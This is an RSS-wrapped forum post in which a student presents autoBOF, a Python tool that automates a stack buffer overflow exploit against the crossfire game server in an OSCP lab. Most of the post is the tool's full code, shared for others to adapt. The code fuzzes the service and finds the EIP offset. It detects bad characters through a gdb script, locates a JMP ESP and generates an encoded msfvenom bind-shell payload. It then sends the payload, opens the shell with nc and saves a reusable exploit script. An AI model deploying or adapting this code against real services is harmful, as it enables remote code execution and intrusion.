          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/2</link>
        <pubDate>Sat, 04 May 2019 07:07:13 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-2</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p><strong>TL;DR I wrote a program to automate buffer overflows. I talk about what buffer overflows are, why I made this program, and show all the code I used.</strong></p>
<p>In 11 days from now, it will have been a year since I first started on my journey of becoming an Offensive Security Certified Professional. In 15 days from now, it will have been a year since the lowest point in my infosec journey. I was feeling very discouraged and out of my depth. During the 4 days in between, I had been breezing through the material - covering multiple sections of coursework in a day. But when I got to the buffer overflow section of the learning material, and it just did not click with me. I failed over and over again for 3 straight days to grasp the material. I began to wonder if I had tried to do too much, too fast and wasn’t sure if I was in over my head or not. I stayed up late that third day, trying to get back on track, and I finally exploited the practice server Offsec provided me. I was ecstatic! And for the most part, I moved on to the next part of my coursework, filing away that new knowledge for the time being. But those three days planted a small seed of pure vengeance in my heart. “Screw buffer overflows!”, the seed said. “You should make it so no one ever has to make these again!”.</p>
<p>As it would turn out, my university wanted me to make something before they’d let me graduate. As long as my advisor deemed it sufficiently complex of a task, I could make whatever my heart desired. As previously stated, my heart desired vengeance (being very fertile soil for such things). Fortunately my advisor thought the idea was interesting and gave me the go-ahead. My first step was to create a design document, outlining the intended functionality of my little project and what it’d look like at each stage. I dreamed very big. The original intention for autoBOF was cross-platform with support for integrating multiple different debuggers in the process. In fact, it was also intended to be a tool used remotely - a thin client that would connect to a remote laboratory environment. It would be a masterpiece, a sword crafted to slay the tedious monster of my past.</p>
<p>None of that happened of course, and the tool ended up being about 500 lines of poorly optimized python that can only run on a local (Linux) laboratory environment. It’s wonky, takes about a minute to run in a best-case scenario, and doesn’t perform anywhere near as well as I originally expected it to. But it works. At least, it works against the crossfire application included in my PWK Kali VM. I do not have the illusion that my code is of any particular quality. In fact, if my professors actually looked at the code I’m about to show you, they may take away the CS degree I expect to receive next month.</p>
<p>Despite having said all of that, this took a lot of effort to make on my part, mostly during the hours of 10PM and 3AM before my weekly progress reports, as well as 0 to 3 random afternoons of any given week. There were also a couple occasions where I over promised what I would accomplish during a given period of time and had to frantically work to make up the difference. It seemed that every time I tried to take something I knew how to do manually and have my program do it automatically, I ran into some difficult (to me) problem to solve that I never anticipated beforehand. Because the tasks required for this program had an extremely minimal overlap with my formal education in programming, I had to break new ground whenever I wanted to do anything. Did I mention this is the first python program I’ve written? Anyway, let’s briefly discuss how these kinds of buffer overflows work and then get to the code.</p>
<hr>
<p>The kind of buffer overflow autoBOF intends to exploit is a very basic kind of overflow. Say there is a server somewhere, that accepts data and stores it in a variable somewhere. Kind of a stretch, but bear with me. And then let’s assume that this server stores this data in variables of a fixed length. What happens if the server lets you send it more data than it can store? What does it do with the extra data? In our ideal case, it just puts it in adjacent memory space, overwriting some other poor sap’s data. And if we can write to system memory… can’t we tell the server to do things it’s not supposed to? That’s the plan! Our general approach is:</p>
<ol>
<li>Fuzz the target server. Does it crash when we send lots of data?</li>
<li>If the server crashes, we may have done something! Let’s find out exactly how much data it takes to crash the server.</li>
<li>We discover that the server crashes when we send X bytes, and the register that directs program execution is overwritten at Y bytes. So we can execute X - Y bytes of code. Hurray!</li>
<li>Sometimes, certain values aren’t processed by the server the way we want them to be processed. Let’s send every relevant value to the server and see if they come out the way we want them to. If not, those values are ‘bad’ and of an undiscerning character. So we call them ‘bad characters’. Or some reason like that.</li>
<li>Next, we need to find a JMP instruction to hijack. We need to tell the program to jump to the payload we make and execute it.</li>
<li>Lastly, if there’s enough space between X and Y to fit our whole payload, we generate one and send it in! If there isn’t enough space, we can put the payload inside our buffer (before Y bytes of data), and hope that we have enough space in the payload space to say ‘Jump to the payload at the start of the buffer’.</li>
</ol>
<p>Note: Please forgive me for any improper indentations. I had to change leading spaces to <code>&amp;nbsp;</code> and may have missed some. You can find the original code at <a href="https://github.com/DiscipleOfDust/autoBOF" rel="nofollow noopener">https://github.com/DiscipleOfDust/autoBOF</a></p>
<hr>
<pre><code class="lang-python">#!/usr/bin/python
# -*- coding: utf-8 -*- 
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
if(sys.argv[1] == "-help" or sys.argv[1] == "-h"): #consider two modes - one with user input, and the other with command line logic
 print "Usage: python autoBOF.py -start [initial data sequence including spaces] -end [any post-payload data sequence including spaces] -l [minimum buffer length] [maximum buffer length] -i [number of bytes to increment buffer by for each attempt] -target [remote IP] [remote port] -local [local IP] [shell port] -p [maximum attempts at payload generation] -n [name of exploit] -s [verbose by default, include to minimize stdout] \n\nExample: python autoBOF.py -start \"x11(setup sound \" -end \"x90x00#\" -l 4368 4400 -i 1 -target 127.0.0.1 13327 -local 127.0.0.1 1337 -p 5 -n overflow.py \nAlternatively, type \"python autoBOF.py -config /path/to/file.txt\" to use a configuration file instead" 
 print "--------------------------------------------------------------------------------------------------"
 print "Config file format example:\nstart: \x11(setup sound \nend:\x90\x00#\nlengthMin: 4368\nlengthMax: 4400\nincrement: 1\ntargetIP: 127.0.0.1\ntargetPort: 13327\nlocalIP: 127.0.0.1\nshellPort: 1337\npayloadAttempts: 5\nexploitName: autoExploit.py\nsilent: False"
 print "--------------------------------------------------------------------------------------------------"
 print "IMPORTANT: Requires partner script, restart.py to be running in tandem. Usage for restart.py: Move file to directory containing vulnerable service binary and type \"gdb -q -x restart.py [service name]\""
 sys.exit()
#init vals
curVal = 0
argStart = 'autoBOF' #AutoBOF is uninit value for input checking
argEnd = 'autoBOF'
argLengthMin = 'autoBOF'
argLengthMax = 'autoBOF'
argIncrement = 'autoBOF'
argTargetIP = 'autoBOF'
argTargetPort = 'autoBOF'
argLocalIP = 'autoBOF'
argShellport = 'autoBOF'
argPayloadAttempts = 'autoBOF'
argExploitName = 'autoBOF'
argSilent = False

if(sys.argv[1] != "-config"):
 for x in sys.argv:
  curVal = curVal + 1
  if (x == "-start"):
   argStart = sys.argv[curVal] #Consider escaping these like below
   argStart = argStart.decode('string_escape')
  elif(x == "-end"):
   argEnd = sys.argv[curVal]
   argEnd = argEnd.decode('string_escape')
  elif(x == "-l"):
   argLengthMin = sys.argv[curVal]
   argLengthMax = sys.argv[curVal+1]
  elif(x == "-i"):
   argIncrement = sys.argv[curVal]
  elif(x == "-target"):
   argTargetIP =  sys.argv[curVal]
   argTargetPort = sys.argv[curVal+1]
  elif(x == "-local"):
   argLocalIP = sys.argv[curVal]
   argShellPort = sys.argv[curVal+1]
  elif(x == "-p"):
   argPayloadAttempts = sys.argv[curVal]
  elif(x == "-n"):
   argExploitName = sys.argv[curVal]
  elif(x == "-s"):
   argSilent = True
else:
 fileName = sys.argv[2]
 bufFile = open(fileName,"r")
 configFile = bufFile.read()
 configFile = configFile.split('\n') #newlines are common bad character, so not being able to parse them in config files isn't the worst thing in the world.
 tempIndex = configFile[0].find(':')
 argStart = configFile[0][tempIndex+2:]
 argStart = argStart.decode('string_escape')
 tempIndex = configFile[1].find(':')
 argEnd = configFile[1][tempIndex+2:]
 argEnd = argEnd.decode('string_escape')
 tempIndex = configFile[2].find(':')
 argLengthMin = configFile[2][tempIndex+2:]
 tempIndex = configFile[3].find(':')
 argLengthMax = configFile[3][tempIndex+2:]
 tempIndex = configFile[4].find(':')
 argIncrement = configFile[4][tempIndex+2:]
 tempIndex = configFile[5].find(':')
 argTargetIP = configFile[5][tempIndex+2:]
 tempIndex = configFile[6].find(':')
 argTargetPort = configFile[6][tempIndex+2:]
 tempIndex = configFile[7].find(':')
 argLocalIP = configFile[7][tempIndex+2:]
 tempIndex = configFile[8].find(':')
 argShellPort = configFile[8][tempIndex+2:]
 tempIndex = configFile[9].find(':')
 argPayloadAttempts = configFile[9][tempIndex+2:]
 tempIndex = configFile[10].find(':')
 argExploitName = configFile[10][tempIndex+2:]
 tempIndex = configFile[11].find(':')
 argSilent = configFile[11][tempIndex+2:]
 if (argSilent == "True"):
  argSilent = True
 else:
  argSilent = False
#Check the arguments for proper initialization
if(argStart == 'autoBOF'):
 print 'ERROR: uninitialized start argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argEnd == 'autoBOF'):
 print 'ERROR: uninitialized end argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMin == 'autoBOF' or argLengthMin.isdigit() == False):
 print 'ERROR: uninitialized or invalid minimum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMax == 'autoBOF' or argLengthMax.isdigit() == False):
 print 'ERROR: uninitialized or invalid maximum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argIncrement == 'autoBOF' or argIncrement.isdigit() == False):
 print 'ERROR: uninitialized or invalid buffer length increment argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetIP == 'autoBOF'):
 print 'ERROR: uninitialized Target IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetPort == 'autoBOF' or argTargetPort.isdigit() == False):
 print 'ERROR: uninitialized or invalidTarget Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLocalIP == 'autoBOF'):
 print 'ERROR: uninitialized Local IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argShellPort == 'autoBOF' or argShellPort.isdigit() == False):
 print 'ERROR: uninitialized Shell Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argPayloadAttempts == 'autoBOF' or argPayloadAttempts.isdigit() == False):
 print 'Warning: Unitialized number of payload attemps. Will be set to 3. Try autoBOF.py -h for more details'
 argPayloadAttempts = 3
if(argExploitName == 'autoBOF'):
 print 'ERROR: uninitialized Exploit Name argument. Try autoBOF.py -h for more details'
 sys.exit()
if(len(argExploitName) &lt; 3):
 print 'ERROR: Exploit name must be at least three characters long'
sys.exit()
</code></pre>
<hr>
<p>Alright, so here we have how the user interacts with the program. They can either make a configuration file (my recommendation) which contains all the necessary specifications for the program to execute, or they can use flags if they are so inclined. I found there to be so many flags that I never actually tested whether or not that functionality worked. I ran into some encoding issues that made me try to configuration file as a solution, and when I solved that problem (which turned out to be completely unrelated to the input method), I slapped the same solution onto the flag parsing, but since I never tested that it may be completely broken.</p>
<p>You may also notice a lack of shell customization (Never got around to implementing shell customization. It might have taken half an hour, it might have taken a day). Hopefully bind shells are okay. I also hope that your service doesn’t require one of the variables to be ‘autoBOF’ for some reason, because then my program wouldn’t work at all. Of particular note here are my half assed type checking and some random comments I don’t remember making and could have sworn I removed from the code for being irrelevant or nonsensical.</p>
<hr>
<pre><code class="lang-python">#Start program execution
if(not argSilent):
 os.system("figlet autoBOF") #Optional but very important dependency
host = argTargetIP
port = int(argTargetPort)
buffer = ('\x41')
start = argStart
end = argEnd
isSuccess = False
overflow = buffer
tryUntil = int(argLengthMax)
startCount = int(argLengthMin)
increment = int(argIncrement)
if(not argSilent):
 print "---- Attempting to Crash Service ----"
while(startCount &lt; tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  if(not argSilent):
   print "fuzzing at", startCount, "bytes", "out of", tryUntil
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(.6)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
if(not isSuccess):
 if(not argSilent):
  print "---- Service is Resilient  ----"
  print("No overflow up to"),tryUntil,"bytes"
 sys.exit()
#END OVERFLOW DETECTION
</code></pre>
<hr>
<p>I hope you like the code you see above because I copy and paste it a lot instead of reusing it in a method like a practical, efficient programmer. Here the program sends a sequence of A’s to the service inside a user-specified wrapper. The debugger script I wrote (which will be shown later) dumps the eip register whenever the targeted service crashes. The code will loop until it reaches the user specified limit or until the EIP register is overwritten with A’s. If it is, we can continue searching for our buffer overflow! If A is a bad character we’ll be in a bit of trouble, though. Anyway, one of the problems I had with this section of code was trying to figure out the optimal way to fuzz a service. Some of these overflows only happen at extremely specific amounts of data, and a difference of one byte could make or break the exploit. As a result, I decided to leave it entirely up to the user and thus absolve myself of that responsibility. By that I mean to say I’m empowering the users by maximizing the customization potential of my software.</p>
<hr>
<pre><code class="lang-python">if(not argSilent):
 print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount)
bashCommand = bashCommand + strTest + " &gt; offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
if(not argSilent):
 print("Unique Buffer Sent")
 print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(.6)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
startValue = eipValue.find("0x")
eipValue = eipValue[startValue:(startValue+10)]
if(not argSilent):
 print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " &gt; offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
startValue = offset.find("offset")+7
offset = offset[startValue:]
offset = offset.strip('\n')
offset = int(offset)
shellSpace = startCount - offset

if(not argSilent):
print "Offset is at", offset, "bytes with", (shellSpace), "bytes of post-offset shellcode space"
</code></pre>
<hr>
<p>The above code is very straightforward - I call Metasploit’s pattern creation and offset tools to add a custom string to the buffer in order to determine exactly where the overwrite takes place. This lets me know how much space I have to work with to place shellcode. I am again aided by my lovely debugger script.</p>
<hr>
<pre><code class="lang-python"> ########## Bad Character Phase ##########
 print '--- Bad Character Detection Phase ---'
#removed 00, 0A, OD, FF as common bad characters
badchars_hex = ["\x00", "\x0a", "\x0d", "\xff"]
badchars_text = ["00","0a","0d","ff"]
allchars_hex = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0b","\x0c","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe"]
allchars_text = ["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe"]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) &gt; 4):
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]
 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  if(not argSilent):
   print "BAD CHARACTER DETECTED IN ", section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
if(not argSilent):
 print "unsure values are", allchars_unsure_text
 print "---Verifying Bad Characters ---"
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) &gt; 0):
 section_hex = "\x41" + "\x41" + "\x41" + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + "414141"
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]

 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  if(not argSilent):
   print "BADCHAR VERIFIED:", allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

if(not argSilent):
 print "Badchar Detection Complete!"
 print "Bad Characters:", badchars_text
print "Acquiring JMP ESP..."
</code></pre>
<hr>
<p>This was one of the hardest parts of the program for me to make, as I had no idea whatsoever how to dump and access the relevant memory with gdb. I take a list of every possible ascii character value in hex, and send them in groups of 4 to the service to see if they display properly in memory. If they do, great! If not, one of those 4 characters is a ‘bad character’ and needs to be avoided when I generate my payload. So I add all 4 characters to an array of possible bad characters (since I don’t know which character is the bad one), whenever the expected character sequence fails to appear in memory.</p>
<p>I then do another pass at the service with the allchars_unsure array as my value library, sending each byte in a sequence paired with 3 A’s. Since my program operates under the assumption that A’s are valid characters, I know exactly what to look for. I found this to be a good compromise to approaching this problem, as one bad character can corrupt all of the output after it. I found groups of 4 bytes to be the most convenient to look for and parse with my debugger script, and that’s what I went with. This is probably also where my project falls the farthest from its goal of being an automated buffer overflow generator, since it’s possible a bad character could be invalid but display correctly in memory, and only corrupt the rest of the sequence. In this case, my program would fail to detect 1 out of every 4 such bad characters at a minimum.</p>
<hr>
<pre><code class="lang-python">bufFile = open("/usr/games/crossfire/bin/jmpSearch.txt", "r")
jmpData = bufFile.read()
jmpData = '\n'.join(jmpData.split('\n')[1:])

offset1 = jmpData[8:10].decode("hex")
offset2 = jmpData[6:8].decode("hex")
offset3 = jmpData[4:6].decode("hex")
offset4 = jmpData[2:4].decode("hex")
eipString = offset1 + offset2 + offset3 + offset4
badlist = ""
while (len(badchars_text) &gt; 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)

badlist = "\\x" + badlist[0:2] + "\\x" + badlist[2:4] + "\\x" + badlist[4:6] + "\\x" + badlist[6:8]
argPayloadAttempts = int(argPayloadAttempts)
bashCommand = "msfvenom -p linux/x86/shell_bind_tcp LPORT=" + argShellPort + " -f raw -b \"" + badlist + "\" -e x86/shikata_ga_nai -o shellcode.txt"
#Payload JMP Offset Detection Phase
eaxLength = len(start)-2
jmpEAXCommand = "(echo \"add eax, "+ str(eaxLength) + "\") | exec /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &gt; eaxHelp.txt 2&gt;/dev/null"
os.system(jmpEAXCommand)
bufFile = open("eaxHelp.txt")
eaxValue = bufFile.read()
eaxValue = eaxValue.replace("nasm","")
eaxValue = eaxValue.replace(" 00000000 ","")
eaxValue = eaxValue.replace("add eax,byte +0xc","")
eaxValue = eaxValue.replace(" ","")
eaxValue = eaxValue.replace("\n","")
eaxValue = eaxValue.replace("&gt;"," ")
eaxValue = eaxValue[9:]
eaxLength2 = len(eaxValue)
eaxValue = eaxValue[:eaxLength2-9]
eaxLength2 = len(eaxValue)
retString = ""
control = 0
while(eaxLength2 &gt; 0):
 retString = retString + "\\x" + eaxValue[control:control+2]
 eaxLength2 = eaxLength2-2
 control = control + 2
retString = retString.lower()
oldString = retString
retString = retString.decode("string_escape")
</code></pre>
<hr>
<p>My debugger script has helpfully created a file that contains a valid JMP ESP for us to hijack. So we use that, as well as the other information we’ve gathered so far, in order to create a bash command that will generate a payload. Additionally, since the service I was testing this code against only had 11 bytes of post-offset shellcode space, I decided to have the program assume there will never be enough space after the offset value to insert a payload, and to instead put the payload at the beginning of the buffer, and assume that there will be enough space after the offset to include a JMP instruction to redirect execution to that location. I use another one of Metasploit’s tools for this, albeit very messily.</p>
<hr>
<pre><code class="lang-python"> if(not argSilent):
  print "--- Building Payload ---"
 os.system(bashCommand)
 bufFile = open("shellcode.txt", "r")
 shellcode = bufFile.read()
 newBuffer = start + shellcode + ("\x41" * (offset-len(shellcode))) + eipString + retString + ("\xff\xe0\x90\x90") + end #the hardcoded values tell the program to jump to the prior variable value
 if(not argSilent):
  print "----------------------"
  print "Deploying Payload..."
 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 if(not argSilent):
  print("--- Initiating Bind Shell Connection ---")
 time.sleep(.6)
 output =  os.system("nc -v "+argLocalIP+" "+argShellPort)
 if(output == 0 or output == 2):
  argPayloadAttempts = 0
  payloadSuccess = True
 else:
  print "Connection Failure!"
  argPayloadAttempts = argPayloadAttempts - 1
if(not payloadSuccess):
 if(not argSilent):
  print "Payload Deployment Failed. Exiting program"
sys.exit()
</code></pre>
<hr>
<p>This is the (most) fun part! We try to build a payload, deploy it, and catch a shell. We try this a user specified number of times, using the same copy-pasted socket code as always.</p>
<hr>
<pre><code class="lang-python">###Build PayloadFile####
os.system("mv shellcode.txt " + argExploitName[0:3] +"Shellcode.txt")
shebang = "#!/usr/bin/python"
load = "import socket, os, time"
output = "output = 256"
outText = "print \"--- Spawning Shell ---\""
host = "host = \"" + str(argTargetIP) + "\""
port = "port = " + str(argTargetPort)
fileStart = "start = \"" + argStart.encode("string_escape") + "\""
fileEnd = "end = \"" + argEnd.encode("string_escape") + "\""
valOverwrite = "eipString = \"" + eipString.encode("string_escape") + "\""
jmpEax = "jmpEax = \"" + oldString + "\xff\xe0\x90\x90\"".encode("string_escape")
bufOne = "bufFile = open(\"" + argExploitName[0:3] + "Shellcode.txt" + "\", \"r\")"
bufTwo = "shellcode = bufFile.read()"
flow = "flow = \"A\" * " + str(offset-len(shellcode))
code = "buffer = (start + shellcode + flow + eipString + jmpEax + end)"
loopMe = "while(output == 256):"
networking1 = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
networking2 = "s.connect((host, port))"
networking3 = "s.send(buffer)"
networking4 = "os.system(\"nc -v " + str(argTargetIP) + " " + str(argShellPort) + " 2&gt;/dev/null\")" #TODO change argShellPort to a more logical name, like argShellPort
ductTape = "time.sleep(.6)"
fullExploit = shebang + "\n" + load + "\n" + output + "\n" + host  + "\n" + port  + "\n" + fileStart + "\n" + flow + "\n" + fileEnd + "\n" + valOverwrite + "\n" + jmpEax + "\n" + bufOne + "\n" + bufTwo + "\n" + code  + "\n" + outText + "\n" + loopMe +  "\n " + networking1 + "\n " + networking2 + "\n " + networking3 + "\n " + ductTape + "\n " + networking4 + "\n "
savedExploit = open(argExploitName, "w")
savedExploit.write(fullExploit)
savedExploit.close()
if(not argSilent):
 print "----------------------"
 print "Exploit saved as " + argExploitName + ", please keep in the same directory as " +  (argExploitName[0:3] + "Shellcode.txt")
os.system("rm eaxHelp.txt")
os.system("rm offset.txt")
</code></pre>
<hr>
<p>We now save a very bad replica of this exploit we just made for later use. The buffer stays in a special file of its own because I couldn’t figure out how to properly write it to a single a file without encoding issues that cause the exploit to fail. Additionally, even though it should theoretically work on the first try (given we’re using the exact same buffer that worked before), it sometimes takes upwards of a minute’s worth of attempts to successfully exploit the service. I have no idea why. Maybe address space layout randomization, even though I thought I disabled that in my environment? Who knows! Also we delete a few temporary files we don’t need anymore and exit.</p>
<hr>
<pre><code class="lang-python">#!gdb
import sys
import gdb
import os
os.system("echo resetFile &gt; eip.txt")
number_restarts = 100
gdb.execute("set pagination off")
os.system("/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-bin_tools-0.1.4/bin/msfelfscan -j esp ./crossfire &gt; jmpSearch.txt")
def on_stop(sig):
  global number_restarts
  if isinstance(sig, gdb.SignalEvent):
    if (number_restarts &gt; 0):
      os.system("rm eip.txt")
      gdb.execute("set confirm off")
      gdb.execute("set logging file eip.txt")
      gdb.execute("set logging on")
      gdb.execute("set logging overwrite on")
      gdb.execute("info registers eip")
      gdb.execute("set logging off")
      gdb.execute("set logging file badchars.txt")
      gdb.execute("set logging on")
      gdb.execute("x/500xw $esp")
      gdb.execute("set logging overwrite off")
      gdb.execute("set logging off")
      gdb.execute("kill")
      gdb.execute("run")
gdb.events.stop.connect (on_stop)
gdb.execute("run")
</code></pre>
<hr>
<p>Lastly, we have my debugger script. On startup, it wipes anything from past exploit attempts and dumps a list of hijackable ESP’s for the main program to use. Additionally, whenever the program crashes for any reason whatsoever, it dumps the EIP registry and 500 lines of stack memory for usage by my main program.</p>
<hr>
<p>That’s pretty much it. You’re welcome to adapt or use this code for your own purposes, if you think it has any value. I’m reasonably confident I could emulate the restart script with mona and have it work with immunity debugger, and thus be cross platform. In such a case, this tool may be functional (with some work) on the OSCP exam. I’m not sure whether or not it would be allowed though, since then you wouldn’t actually have to know what you’re doing in order to pass that portion of the test. That being said, given my poor programming ability (and the scarcity of these exploits in the wild), it would also be reasonable to assume there isn’t much value to my project outside of it being a wonderful learning experience for me. If anyone has any questions, I will add them to my Q&amp;A, and please feel free to ask whatever comes to mind.</p>
